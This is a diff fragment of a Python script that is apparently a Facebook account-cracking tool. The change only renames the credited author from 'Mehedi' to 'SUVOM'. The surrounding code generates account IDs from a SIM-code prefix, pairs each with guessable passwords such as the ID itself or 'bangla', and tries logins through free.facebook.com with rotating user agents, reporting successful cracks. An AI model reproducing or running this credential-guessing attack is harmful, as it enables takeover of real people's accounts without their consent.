@@ -102,13 +102,13 @@ def love():
         tl = str(len(user))
         print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
         print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
-        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY Mehedi JOIN MY GROUP ')
+        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY SUVOM JOIN MY GROUP ')
         print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
         print('\033[1;32m─────────────────────────────────────────────────────────')
         for guru in user:
             uid = nude+nudex+nud+guru
             pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
-            Mehedi.submit(rcrack,uid,pwx,tl)
+            SUVOM.submit(rcrack,uid,pwx,tl)
     print('\033[1;32m─────────────────────────────────────────────────────────')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
     print('\033[1;32m─────────────────────────────────────────────────────────')
@@ -122,7 +122,7 @@ def rcrack(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sMehedi\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sSUVOM\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
